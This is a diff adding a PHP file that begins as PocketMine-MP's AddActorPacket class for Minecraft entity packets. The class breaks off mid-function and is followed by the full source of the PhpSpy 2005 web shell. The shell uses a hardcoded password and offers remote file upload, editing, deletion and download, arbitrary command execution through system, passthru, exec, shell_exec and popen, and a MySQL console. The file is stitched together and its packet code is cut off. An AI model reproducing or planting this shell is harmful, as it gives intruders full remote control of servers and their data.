@@ -1,0 +1,894 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\network\mcpe\protocol;
+
+#include <rules/DataPacket.h>
+
+use pocketmine\entity\Attribute;
+use pocketmine\entity\EntityIds;
+use pocketmine\math\Vector3;
+use pocketmine\network\mcpe\NetworkSession;
+use pocketmine\network\mcpe\protocol\types\EntityLink;
+use function count;
+
+class AddActorPacket extends DataPacket{
+	public const NETWORK_ID = ProtocolInfo::ADD_ACTOR_PACKET;
+
+	/*
+	 * Really really really really really nasty hack, to preserve backwards compatibility.
+	 * We can't transition to string IDs within 3.x because the network IDs (the integer ones) are exposed
+	 * to the API in some places (for god's sake shoghi).
+	 *
+	 * TODO: remove this on 4.0
+	 */
+	public const LEGACY_ID_MAP_BC = [
+		EntityIds::NPC => "minecraft:npc",
+		EntityIds::PLAYER => "minecraft:player",
+		EntityIds::WITHER_SKELETON => "minecraft:wither_skeleton",
+		EntityIds::HUSK => "minecraft:husk",
+		EntityIds::STRAY => "minecraft:stray",
+		EntityIds::WITCH => "minecraft:witch",
+		EntityIds::ZOMBIE_VILLAGER => "minecraft:zombie_villager",
+		EntityIds::BLAZE => "minecraft:blaze",
+		EntityIds::MAGMA_CUBE => "minecraft:magma_cube",
+		EntityIds::GHAST => "minecraft:ghast",
+		EntityIds::CAVE_SPIDER => "minecraft:cave_spider",
+		EntityIds::SILVERFISH => "minecraft:silverfish",
+		EntityIds::ENDERMAN => "minecraft:enderman",
+		EntityIds::SLIME => "minecraft:slime",
+		EntityIds::ZOMBIE_PIGMAN => "minecraft:zombie_pigman",
+		EntityIds::SPIDER => "minecraft:spider",
+		EntityIds::SKELETON => "minecraft:skeleton",
+		EntityIds::CREEPER => "minecraft:creeper",
+		EntityIds::ZOMBIE => "minecraft:zombie",
+		EntityIds::SKELETON_HORSE => "minecraft:skeleton_horse",
+		EntityIds::MULE => "minecraft:mule",
+		EntityIds::DONKEY => "minecraft:donkey",
+		EntityIds::DOLPHIN => "minecraft:dolphin",
+		EntityIds::TROPICALFISH => "minecraft:tropicalfish",
+		EntityIds::WOLF => "minecraft:wolf",
+		EntityIds::SQUID => "minecraft:squid",
+		EntityIds::DROWNED => "minecraft:drowned",
+		EntityIds::SHEEP => "minecraft:sheep",
+		EntityIds::MOOSHROOM => "minecraft:mooshroom",
+		EntityIds::PANDA => "minecraft:panda",
+		EntityIds::SALMON => "minecraft:salmon",
+		EntityIds::PIG => "minecraft:pig",
+		EntityIds::VILLAGER => "minecraft:villager",
+		EntityIds::COD => "minecraft:cod",
+		EntityIds::PUFFERFISH => "minecraft:pufferfish",
+		EntityIds::COW => "minecraft:cow",
+		EntityIds::CHICKEN => "minecraft:chicken",
+		EntityIds::BALLOON => "minecraft:balloon",
+		EntityIds::LLAMA => "minecraft:llama",
+		EntityIds::IRON_GOLEM => "minecraft:iron_golem",
+		EntityIds::RABBIT => "minecraft:rabbit",
+		EntityIds::SNOW_GOLEM => "minecraft:snow_golem",
+		EntityIds::BAT => "minecraft:bat",
+		EntityIds::OCELOT => "minecraft:ocelot",
+		EntityIds::HORSE => "minecraft:horse",
+		EntityIds::CAT => "minecraft:cat",
+		EntityIds::POLAR_BEAR => "minecraft:polar_bear",
+		EntityIds::ZOMBIE_HORSE => "minecraft:zombie_horse",
+		EntityIds::TURTLE => "minecraft:turtle",
+		EntityIds::PARROT => "minecraft:parrot",
+		EntityIds::GUARDIAN => "minecraft:guardian",
+		EntityIds::ELDER_GUARDIAN => "minecraft:elder_guardian",
+		EntityIds::VINDICATOR => "minecraft:vindicator",
+		EntityIds::WITHER => "minecraft:wither",
+		EntityIds::ENDER_DRAGON => "minecraft:ender_dragon",
+		EntityIds::SHULKER => "minecraft:shulker",
+		EntityIds::ENDERMITE => "minecraft:endermite",
+		EntityIds::MINECART => "minecraft:minecart",
+		EntityIds::HOPPER_MINECART => "minecraft:hopper_minecart",
+		EntityIds::TNT_MINECART => "minecraft:tnt_minecart",
+		EntityIds::CHEST_MINECART => "minecraft:chest_minecart",
+		EntityIds::COMMAND_BLOCK_MINECART => "minecraft:command_block_minecart",
+		EntityIds::ARMOR_STAND => "minecraft:armor_stand",
+		EntityIds::ITEM => "minecraft:item",
+		EntityIds::TNT => "minecraft:tnt",
+		EntityIds::FALLING_BLOCK => "minecraft:falling_block",
+		EntityIds::XP_BOTTLE => "minecraft:xp_bottle",
+		EntityIds::XP_ORB => "minecraft:xp_orb",
+		EntityIds::EYE_OF_ENDER_SIGNAL => "minecraft:eye_of_ender_signal",
+		EntityIds::ENDER_CRYSTAL => "minecraft:ender_crystal",
+		EntityIds::SHULKER_BULLET => "minecraft:shulker_bullet",
+		EntityIds::FISHING_HOOK => "minecraft:fishing_hook",
+		EntityIds::DRAGON_FIREBALL => "minecraft:dragon_fireball",
+		EntityIds::ARROW => "minecraft:arrow",
+		EntityIds::SNOWBALL => "minecraft:snowball",
+		EntityIds::EGG => "minecraft:egg",
+		EntityIds::PAINTING => "minecraft:painting",
+		EntityIds::THROWN_TRIDENT => "minecraft:thrown_trident",
+		EntityIds::FIREBALL => "minecraft:fireball",
+		EntityIds::SPLASH_POTION => "minecraft:splash_potion",
+		EntityIds::ENDER_PEARL => "minecraft:ender_pearl",
+		EntityIds::LEASH_KNOT => "minecraft:leash_knot",
+		EntityIds::WITHER_SKULL => "minecraft:wither_skull",
+		EntityIds::WITHER_SKULL_DANGEROUS => "minecraft:wither_skull_dangerous",
+		EntityIds::BOAT => "minecraft:boat",
+		EntityIds::LIGHTNING_BOLT => "minecraft:lightning_bolt",
+		EntityIds::SMALL_FIREBALL => "minecraft:small_fireball",
+		EntityIds::LLAMA_SPIT => "minecraft:llama_spit",
+		EntityIds::AREA_EFFECT_CLOUD => "minecraft:area_effect_cloud",
+		EntityIds::LINGERING_POTION => "minecraft:lingering_potion",
+		EntityIds::FIREWORKS_ROCKET => "minecraft:fireworks_rocket",
+		EntityIds::EVOCATION_FANG => "minecraft:evocation_fang",
+		EntityIds::EVOCATION_ILLAGER => "minecraft:evocation_illager",
+		EntityIds::VEX => "minecraft:vex",
+		EntityIds::AGENT => "minecraft:agent",
+		EntityIds::ICE_BOMB => "minecraft:ice_bomb",
+		EntityIds::PHANTOM => "minecraft:phantom",
+		EntityIds::TRIPOD_CAMERA => "minecraft:tripod_camera"
+	];
+
+	/** @var int|null */
+	public $entityUniqueId = null; //TODO
+	/** @var int */
+	public $entityRuntimeId;
+	/** @var string */
+	public $type;
+	/** @var Vector3 */
+	public $position;
+	/** @var Vector3|null */
+	public $motion;
+	/** @var float */
+	public $pitch = 0.0;
+	/** @var float */
+	public $yaw = 0.0;
+	/** @var float */
+	public $headYaw = 0.0;
+
+	/** @var Attribute[] */
+	public $attributes = [];
+	/**
+	 * @var mixed[][]
+	 * @phpstan-var array<int, array{0: int, 1: mixed}>
+	 */
+	public $metadata = [];
+	/** @var EntityLink[] */
+	public $links = [];
+
+	protected function decodePayload(){
+		$this->entityUniqueId = $this->getEntityUniqueId();
+		$this->entityRuntimeId = $this->getEntityRuntimeId();
+		$this->type = $this->getString();
+		$this->position = $this->getVector3();
+		$this->motion = $this->getVector3();
+		$this->pitch = $this->getLFloat();
+		$this->yaw = $this->getLFloat();
+		$this->headYaw = $this->getLFloat();
+
+		$attrCount = $this->getUnsignedVarInt();
+		for($i = 0; $i < $attrCount; ++$i){
+			$name = $this->getString();
+			$min = $this->getLFloat();
+			$current = $this->getLFloat();
+			$max = $this->getLFloat();
+			$attr = Attribute::getAttributeByName($name);
+
+			if($attr !== null){
+				$attr->setMinValue($min);
+				$attr->setMaxValue($max);
+				$attr->setValue($current);
+				$this->attributes[] = $attr;
+			}else{
+				throw new \UnexpectedValueException("Unknown attribute type \"$name\"");
+			}
+		}
+
+		$this->metadata = $this->getEntityMetadata();
+		$linkCount = $this->getUnsignedVarInt();
+		for($i = 0; $i < $linkCount; ++$i){
+			$this->links[] = $this->getEntityLink();
+		}
+	}
+
+	protected function encodePayload(){
+		$this->putEntityUniqueId($this->entityUniqueId ?? $this->entityRuntimeId);
+		$this->putEntityRuntimeId($this->entityRuntimeId);
+		$this->putString($this->type);
+		$this->putVector3($this->position);
+		$this->putVector3Nullable($this->motion);
+		$this->putLFloat($this->pitch);
+		$this->putLFloat($this->yaw);
+		$this->putLFloat($this->headYaw);
+
+		$this->putUnsignedVarInt(count($this->attributes));
+<?php
+/*
++--------------------------------------------------------------------------+
+| str_replace("-", "", "P-h-p-S-p-y") Version:2005 Lite                    |
+| Codz by Angel                                                            |
+| (c) 2004 Security Angel Team                                             |
+| http://www.4ngel.net                                                     |
+| ======================================================================== |
+| Team:  http://www.4ngel.net                                              |
+|        http://www.bugkidz.org                                            |
+| Email: 4ngel@21cn.com                                                    |
+| Date:  Dec 28st(My girl friend's birthday), 2004                         |
++--------------------------------------------------------------------------+
+*/
+
+/*
+提示：如果想再精简一些，请自行把所有注释去掉。
+*/
+
+error_reporting(7);
+ob_start();
+$mtime = explode(' ', microtime());
+$starttime = $mtime[1] + $mtime[0];
+
+/*===================== 程序配置 =====================*/
+
+// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
+$admin['check']="1";
+
+// 如果需要密码验证,请修改登陆密码
+$admin['pass']="angel";
+
+/*===================== 配置结束 =====================*/
+
+
+// 允许程序在 register_globals = off 的环境下工作
+if ( function_exists('ini_get') ) {
+	$onoff = ini_get('register_globals');
+} else {
+	$onoff = get_cfg_var('register_globals');
+}
+if ($onoff != 1) {
+	@extract($_POST, EXTR_SKIP);
+	@extract($_GET, EXTR_SKIP);
+}
+
+$self = $_SERVER['PHP_SELF'];
+
+/*===================== 身份验证 =====================*/
+if($admin['check']=="1") {
+	if ($_GET['action'] == "logout") {
+		setcookie ("adminpass", "");
+		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
+		echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面&gt;&gt;&gt;</a></span>";
+		exit;
+	}
+	if ($login) {
+		$adminpass=trim($_POST['adminpass']);
+		if ($adminpass==$admin['pass']) {
+			setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
+			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
+			echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面&gt;&gt;&gt;</a></span>";
+			exit;
+		}
+	}
+	if (isset($_COOKIE['adminpass'])) {
+		if ($_COOKIE['adminpass']!=$admin['pass']) {
+			loginpage();
+		}
+	} else {
+		loginpage();
+	}
+}//end check
+/*===================== 验证结束 =====================*/
+
+// 判断 magic_quotes_gpc 状态
+if (get_magic_quotes_gpc()) {
+    $_GET = stripslashes_array($_GET);
+	$_POST = stripslashes_array($_POST);
+}
+
+if ($_GET['action'] == "phpinfo") {
+	$dis_func = get_cfg_var("disable_functions");
+	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
+	exit;
+}
+
+// 下载文件
+if (!empty($downfile)) {
+	if (!@file_exists($downfile)) {
+		echo "<script>alert('你要下的文件不存在!')</script>";
+	} else {
+		$filename = basename($downfile);
+		$filename_info = explode('.', $filename);
+		$fileext = $filename_info[count($filename_info)-1];
+		header('Content-type: application/x-'.$fileext);
+		header('Content-Disposition: attachment; filename='.$filename);
+		header('Content-Description: PHP Generated Data');
+		header('Content-Length: '.filesize($downfile));
+		@readfile($downfile);
+		exit;
+	}
+}
+
+// 程序目录
+$pathname=str_replace('\\','/',dirname(__FILE__)); 
+
+// 获取当前路径
+if (!isset($dir) or empty($dir)) {
+	$dir = ".";
+	$nowpath = getPath($pathname, $dir);
+} else {
+	$dir=$_GET['dir'];
+	$nowpath = getPath($pathname, $dir);
+}
+
+// 判断读写情况
+if (dir_writeable($nowpath)) {
+	$dir_writeable = "可写";
+} else {
+	$dir_writeable = "不可写";
+}
+
+$dis_func = get_cfg_var("disable_functions");
+$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
+$shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShell</a>" : "";
+?>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>PhpSpy Ver 2005</title>
+<style type="text/css">
+body,td {
+	font-family: "sans-serif";
+	font-size: "12px";
+	line-height: "150%";
+}
+.smlfont {
+	font-family: "sans-serif";
+	font-size: "11px";
+}
+.INPUT {
+	FONT-SIZE: "12px";
+	COLOR: "#000000";
+	BACKGROUND-COLOR: "#FFFFFF";
+	height: "18px";
+	border: "1px solid #666666";
+}
+.redfont {
+	COLOR: "#A60000";
+}
+a:link,
+a:visited,
+a:active{
+	color: "#000000";
+	text-decoration: underline;
+}
+a:hover{
+	color: "#465584";
+	text-decoration: none;
+}
+.firstalt	{BACKGROUND-COLOR: "#EFEFEF"}
+.secondalt	{BACKGROUND-COLOR: "#F5F5F5"}
+</style>
+</head>
+
+<body style="table-layout:fixed; word-break:break-all">
+<center>
+<table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff">
+  <tr bgcolor="#cccccc">
+    <td width="375" align="right" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td>
+    <td width="10" align="center" nowrap><b>:</b></td>
+    <td width="375" nowrap><b><?=$_SERVER['REMOTE_ADDR']?></b></td>
+  </tr>
+  <tr>
+    <td colspan="3" align="center" nowrap><a href="?action=logout">注销会话</a> | <a href="?action=dir">返回 PhpSpy 目录</a> | <a href="?action=phpenv">PHP环境变量</a><?=$phpinfo?><?=$shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="http://www.4ngel.net" target="_blank" title="下载此程序">Version 2005</a></td>
+  </tr>
+</table>
+<hr width="760" noshade>
+<table width="760" border="0" cellpadding="0">
+ <form action="" method="GET">
+  <tr>
+    <td><p>程序路径:<?=$pathname?><br>当前目录(<?=$dir_writeable?>,<?=substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?=$nowpath?>
+        <br>跳转目录:
+        <input name="dir" type="text" class="INPUT">
+        <input type="submit" class="INPUT" value="确定"> 〖支持绝对路径和相对路径〗
+    </p></td>
+  </tr>
+ </form>
+ <form action="?dir=<?=urlencode($dir)?>" method="POST" enctype="multipart/form-data">
+  <tr>
+    <td colspan="2">上传文件到当前目录:
+      <input name="uploadmyfile" type="file" class="INPUT">	<input type="submit" name="uploadfile" class="INPUT" value="确定"><input type="hidden" name="uploaddir" value="<?=$dir?>"></td>
+  </tr>
+  </form>
+  <form action="?action=editfile&dir=<?=urlencode($dir)?>" method="POST">
+  <tr>
+    <td colspan="2">新建文件在当前目录:
+        <input name="newfile" type="text" class="INPUT" value="">
+        <input type="submit" name="createfile" class="INPUT" value="确定"></td>
+  </tr>
+  </form>
+</table>
+<hr width="760" noshade>
+<?php
+/*===================== 执行操作 开始 =====================*/
+echo "<p><b>\n";
+// 删除文件
+if(@$delfile!="") {
+	if(file_exists($delfile)) {
+		if (@unlink($delfile)) {
+			echo "".$delfile." 删除成功!";
+		} else {
+			echo "文件删除失败!";
+		}
+	} else {
+		echo "文件已不存在,删除失败!";
+	}
+}
+
+// 删除目录
+elseif($rmdir) {
+	if($deldir!="") {
+		$deldirs="$dir/$deldir";
+		if(!file_exists("$deldirs")) {
+			echo "目录已不存在!";
+		} else {
+			deltree($deldirs);
+		}
+	} else {
+		echo "删除失败!";
+	}
+}
+
+// 上传文件
+elseif($uploadfile) {
+	echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "上传成功!" : "上传失败!";
+}
+
+// 编辑文件
+elseif($doeditfile) {
+	$filename="$editfilename";
+	@$fp=fopen("$filename","w");
+	echo $msg=@fwrite($fp,$_POST['filecontent']) ? "写入文件成功!" : "写入失败!";
+	@fclose($fp);
+}
+
+// 连接MYSQL
+elseif($connect) {
+	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
+		echo "数据库连接成功!";
+		mysql_close();
+	} else {
+		echo mysql_error();
+	}
+}
+
+// 执行SQL语句
+elseif($doquery) {
+	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
+	@mysql_select_db($dbname) or die("选择数据库失败");
+	$result = @mysql_query($_POST['sql_query']);
+	echo ($result) ? "SQL语句成功执行" : "出错: ".mysql_error();
+	mysql_close();
+}
+
+// 查看PHP配置参数状况
+elseif($viewphpvar) {
+	echo "配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."";
+}
+
+else {
+	echo "本程序由 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> 小组 angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] 独立开发,可在 <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> 下载最新版本.";
+}
+
+echo "</b></p>\n";
+/*===================== 执行操作 结束 =====================*/
+
+if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
+?>
+<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+  <tr bgcolor="#cccccc">
+    <td align="center" nowrap width="30%"><b>文件</b></td>
+	<td align="center" nowrap width="17%"><b>创建日期</b></td>
+    <td align="center" nowrap width="17%"><b>最后修改</b></td>
+    <td align="center" nowrap width="12%"><b>大小</b></td>
+    <td align="center" nowrap width="7%"><b>属性</b></td>
+    <td align="center" nowrap width="17%"><b>操作</b></td>
+  </tr>
+<?php
+// 目录列表
+$dirs=@opendir($dir);
+while ($file=@readdir($dirs)) {
+	$filepath="$dir/$file";
+	$a=@is_dir($filepath);
+	if($a=="1"){
+		if($file!=".." && $file!=".")	{
+			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
+			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
+			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
+			echo "<tr class=".getrowbg().">\n";
+			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
+			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
+			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
+			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">&lt;dir&gt;</td>\n";
+			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$dirperm</td>\n";
+			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">删除</a></td>\n";
+			echo "</tr>\n";
+			$dir_i++;
+		} else {
+			if($file=="..") {
+				echo "<tr class=".getrowbg().">\n";
+				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
+				echo "</tr>\n";
+			}
+		}
+	}
+}//while
+@closedir($dirs); 
+?>
+<tr bgcolor="#cccccc">
+  <td colspan="6" height="5"></td>
+</tr>
+<?
+// 文件列表
+$dirs=@opendir($dir);
+while ($file=@readdir($dirs)) {
+	$filepath="$dir/$file";
+	$a=@is_dir($filepath);
+	if($a=="0"){
+		$size=@filesize($filepath);
+		$size=$size/1024 ;
+		$size= @number_format($size, 3);
+		
+		$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
+		$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
+		
+		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
+		echo "<tr class=".getrowbg().">\n";
+		echo "  <td style=\"padding-left: 5px;\"><a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
+		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
+		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
+		echo "  <td align=\"right\" nowrap valign=\"top\" class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
+		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$fileperm</td>\n";
+		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($filepath)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($filepath)."\">删除</a></td>\n";
+		echo "</tr>\n";
+		$file_i++;
+	}
+}
+@closedir($dirs); 
+?>
+<tr class="<?=getrowbg()?>">
+  <td nowrap colspan="6" align="right"><?=$dir_i?> 个目录 / <?=$file_i?> 个文件</td>
+    </tr>
+  </table></td>
+</tr>
+</table>
+
+<?php
+}// end dir
+
+elseif ($_GET['action'] == "editfile") {
+	if($newfile=="") {
+		$filename="$dir/$editfile";
+		$fp=@fopen($filename,"r");
+		$contents=@fread($fp, filesize($filename));
+		@fclose($fp);
+		$contents=htmlspecialchars($contents);
+	}else{
+		$editfile=$newfile;
+		$filename = "$dir/$editfile";
+	}
+?>
+<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+  <tr class="firstalt">
+    <td align="center">新建/编辑文件 [<a href="?dir=<?=urlencode($dir)?>">返回</a>]</td>
+  </tr>
+  <form action="?dir=<?=urlencode($dir)?>" method="POST">
+  <tr class="secondalt">
+    <td align="center">当前文件:<input class="input" type="text" name="editfilename" size="30"
+value="<?=$filename?>"> 输入新文件名则建立新文件</td>
+  </tr>  
+  <tr class="firstalt">
+    <td align="center"><textarea name="filecontent" cols="100" rows="20"><?=$contents?></textarea></td>
+  </tr>  
+  <tr class="secondalt">
+    <td align="center"><input type="submit" name="doeditfile" value="确定写入" class="input">
+      <input type="reset" value="重置" class="input"></td>
+  </tr>
+  </form>
+</table>
+<?php
+}//end editfile
+
+elseif ($_GET['action'] == "shell") {
+	if (!get_cfg_var("safe_mode")) {
+?>
+<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+  <tr class="firstalt">
+    <td align="center">WebShell Mode</td>
+  </tr>
+  <form action="?action=shell&dir=<?=urlencode($dir)?>" method="POST">
+  <tr class="secondalt">
+    <td align="center">
+	  选择执行函数:
+	  <select name="execfunc" class="input">
+		<option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option>
+		<option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
+		<option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
+		<option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
+		<option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
+	  </select>　
+	  输入命令:
+      <input type="text" name="command" size="60" value="<?=$_POST['command']?>" class="input">
+      <input type="submit" value="execute" class="input"></td>
+  </tr>  
+  <tr class="secondalt">
+    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
+	if (!empty($_POST['command'])) {
+		if ($execfunc=="system") {
+			system($_POST['command']);
+		} elseif ($execfunc=="passthru") {
+			passthru($_POST['command']);
+		} elseif ($execfunc=="exec") {
+			$result = exec($_POST['command']);
+			echo $result;
+		} elseif ($execfunc=="shell_exec") {
+			$result=shell_exec($_POST['command']);
+			echo $result;	
+		} elseif ($execfunc=="popen") {
+			$pp = popen($_POST['command'], 'r');
+			$read = fread($pp, 2096);
+			echo $read;
+			pclose($pp);
+		} else {
+			system($_POST['command']);
+		}
+	}
+	?></textarea></td>
+  </tr>  
+  </form>
+</table>
+<?php
+	} else {
+?>
+<p><b>Safe_Mode 已打开, 无法执行系统命令.</b></p>
+<?php
+	}
+}//end shell
+
+elseif ($_GET['action'] == "deldir") {
+?>
+<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+  <form action="?dir=<?=urlencode($dir)?>" method="POST">
+  <tr class="firstalt">
+    <td align="center">删除 <input name="deldir" type="text" value="<?=$deldir?>" class="input" readonly> 目录</td>
+  </tr>  
+  <tr class="secondalt">
+    <td align="center">注意:如果该目录非空,此次操作将会删除该目录下的所有文件.您确定吗?</td>
+  </tr>  
+  <tr class="firstalt">
+    <td align="center">
+	  <input type="submit" name="rmdir" value="delete" class="input">
+	</td>
+  </tr>  
+  </form>
+</table>
+<?php
+}//end deldir
+
+elseif ($_GET['action'] == "sql") {
+	$servername = isset($servername) ? $servername : 'localhost';
+	$dbusername = isset($dbusername) ? $dbusername : 'root';
+	$dbpassword = isset($dbpassword) ? $dbpassword : '';
+	$dbname = isset($dbname) ? $dbname : '';
+?>
+<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+  <tr class="firstalt">
+    <td align="center">执行 SQL 语句</td>
+  </tr>
+  <form action="?action=sql" method="POST">
+  <tr class="secondalt">
+    <td align="center">Host:
+    <input name="servername" type="text" class="INPUT" value="<?=$servername?>"> 
+    User:
+    <input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">
+    Pass:
+    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">
+    DB:
+    <input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>">
+    <input name="connect" type="submit" class="INPUT" value="连接"></td>
+  </tr>
+  <tr class="firstalt">
+    <td align="center"><textarea name="sql_query" cols="85" rows="10"></textarea></td>
+  </tr>
+  <tr class="secondalt">
+    <td align="center"><input type="submit" name="doquery" value="执行" class="input"></td>
+  </tr>  
+  </form>
+</table>
+<?php
+}//end sql query
+
+elseif ($_GET['action'] == "phpenv") {
+?>
+<table width="760" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+ <form action="?action=phpenv" method="POST">
+  <tr class="firstalt">
+    <td style="padding-left: 5px;"><b>查看PHP配置参数状况</b></td>
+  </tr>
+  <tr class="secondalt">
+    <td style="padding-left: 5px;">请输入配置参数(如:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40"> <input type="submit" name="viewphpvar" value="查看" class="input"></td>
+  </tr>
+ </form>
+</table>
+<?php
+}//end phpenv
+?>
+<hr width="760" noshade>
+<table width="760" border="0" cellpadding="0">
+  <tr>
+    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
+    <td align="right"><?php
+	debuginfo();
+	ob_end_flush();	
+	?></td>
+  </tr>
+</table>
+</center>
+</body>
+</html>
+
+<?php
+
+/*======================================================
+函数库
+======================================================*/
+
+	// 登陆入口
+	function loginpage() {
+?>
+		<style type="text/css">
+		input {
+			font-family: "Verdana";
+			font-size: "11px";
+			BACKGROUND-COLOR: "#FFFFFF";
+			height: "18px";
+			border: "1px solid #666666";
+		}
+		</style>
+		<form method="POST" action="">
+		<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
+		<input type="submit" name="login" value="OK">
+		</form>
+<?php
+		exit;
+	}//end loginpage()
+
+	// 页面调试信息
+	function debuginfo() {
+		global $starttime;
+		$mtime = explode(' ', microtime());
+		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
+		echo "Processed in $totaltime second(s)";
+	}
+
+	// 去掉转义字符
+	function stripslashes_array(&$array) {
+		while(list($key,$var) = each($array)) {
+			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
+				if (is_string($var)) {
+					$array[$key] = stripslashes($var);
+				}
+				if (is_array($var))  {
+					$array[$key] = stripslashes_array($var);
+				}
+			}
+		}
+		return $array;
+	}
+
+	// 删除目录
+	function deltree($deldir) {
+		$mydir=@dir($deldir);	
+		while($file=$mydir->read())	{ 		
+			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
+				@chmod("$deldir/$file",0777);
+				deltree("$deldir/$file"); 
+			}
+			if (is_file("$deldir/$file")) {
+				@chmod("$deldir/$file",0777);
+				@unlink("$deldir/$file");
+			}
+		} 
+		$mydir->close(); 
+		@chmod("$deldir",0777);
+		echo @rmdir($deldir) ? "目录删除成功!" : "<font color=\"#ff0000\">目录删除失败!</font>";	
+	} 
+
+	// 判断读写情况
+	function dir_writeable($dir) {
+		if (!is_dir($dir)) {
+			@mkdir($dir, 0777);
+		}
+		if(is_dir($dir)) {
+			if ($fp = @fopen("$dir/test.txt", 'w')) {
+				@fclose($fp);
+				@unlink("$dir/test.txt");
+				$writeable = 1;
+			} else {
+				$writeable = 0;
+			}
+		}
+		return $writeable;
+	}
+
+	// 表格行间的背景色替换
+	function getrowbg() {
+		global $bgcounter;
+		if ($bgcounter++%2==0) {
+			return "firstalt";
+		} else {
+			return "secondalt";
+		}
+	}
+
+	// 获取当前的文件系统路径
+	function getPath($mainpath, $relativepath) {
+		global $dir;
+		$mainpath_info           = explode('/', $mainpath);
